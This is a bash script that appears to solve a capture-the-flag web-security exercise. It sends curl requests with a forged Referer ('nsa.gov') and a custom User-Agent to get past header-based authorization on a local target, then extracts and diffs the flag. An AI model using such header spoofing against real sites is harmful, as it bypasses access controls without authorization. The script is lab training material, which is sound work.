#!/bin/bash

# Custom curl request with evil headers exploit script
# This script demonstrates how to exploit header-based authorization

# Default URL (can be overridden with command line argument)
URL="${1:-http://localhost:8080}"
PAGE="b7e44c7a40c5f80139f0a50f3650fb2bd8d00b0d24667c4c2ca32c88e13b758f"
FULL_URL="${URL}/index.php?page=${PAGE}"

echo "============================================================"
echo "Custom curl request with evil headers - Exploit Script"
echo "============================================================"
echo ""
echo "Target URL: ${FULL_URL}"
echo ""

# Step 1: Test with default headers
echo "Step 1: Testing with default headers..."
echo "----------------------------------------"
DEFAULT_RESPONSE=$(curl --silent "${FULL_URL}")
echo "Response received (showing first 500 chars):"
echo "${DEFAULT_RESPONSE}" | head -c 500
echo ""
echo ""

# Step 2: Test with Referer header
echo "Step 2: Testing with Referer header..."
echo "----------------------------------------"
REFERER_RESPONSE=$(curl --silent --header "Referer: https://www.nsa.gov/" "${FULL_URL}")
echo "Response received (showing first 500 chars):"
echo "${REFERER_RESPONSE}" | head -c 500
echo ""

# Check if we got "FIRST STEP DONE"
if echo "${REFERER_RESPONSE}" | grep -q "FIRST STEP DONE"; then
    echo "✓ FIRST STEP DONE - Referer header accepted!"
else
    echo "✗ Referer header test failed"
fi
echo ""

# Step 3: Test with both Referer and User-Agent headers
echo "Step 3: Testing with Referer + User-Agent headers..."
echo "----------------------------------------"
FULL_RESPONSE=$(curl --silent --header "Referer: https://www.nsa.gov/" --header "User-Agent: ft_bornToSec" "${FULL_URL}")
echo "Full response:"
echo "${FULL_RESPONSE}"
echo ""

# Extract flag if present
FLAG=$(echo "${FULL_RESPONSE}" | grep -oP 'flag is : \K[a-f0-9]+' || echo "")
if [ -n "${FLAG}" ]; then
    echo "============================================================"
    echo "✓ FLAG FOUND: ${FLAG}"
    echo "============================================================"
else
    echo "✗ Flag not found in response"
    echo ""
    echo "Trying alternative extraction methods..."
    # Try different patterns
    FLAG=$(echo "${FULL_RESPONSE}" | grep -i "flag" | head -1)
    if [ -n "${FLAG}" ]; then
        echo "Found flag reference: ${FLAG}"
    fi
fi
echo ""

# Step 4: Show the diff
echo "Step 4: Showing difference between default and modified headers..."
echo "----------------------------------------"
echo "Diff between default and full exploit:"
diff <(echo "${DEFAULT_RESPONSE}") <(echo "${FULL_RESPONSE}") || echo "No differences found or diff command failed"
echo ""

# Alternative: Show using diff command directly
echo "Alternative method - using diff with curl:"
echo "----------------------------------------"
echo "Running: diff <(curl --silent \"${FULL_URL}\") <(curl --silent --header \"Referer: https://www.nsa.gov/\" --header \"User-Agent: ft_bornToSec\" \"${FULL_URL}\")"
echo ""
diff <(curl --silent "${FULL_URL}") <(curl --silent --header "Referer: https://www.nsa.gov/" --header "User-Agent: ft_bornToSec" "${FULL_URL}") 2>/dev/null || echo "Diff completed (exit code indicates differences found)"
echo ""

echo "============================================================"
echo "Exploit completed!"
echo "============================================================"

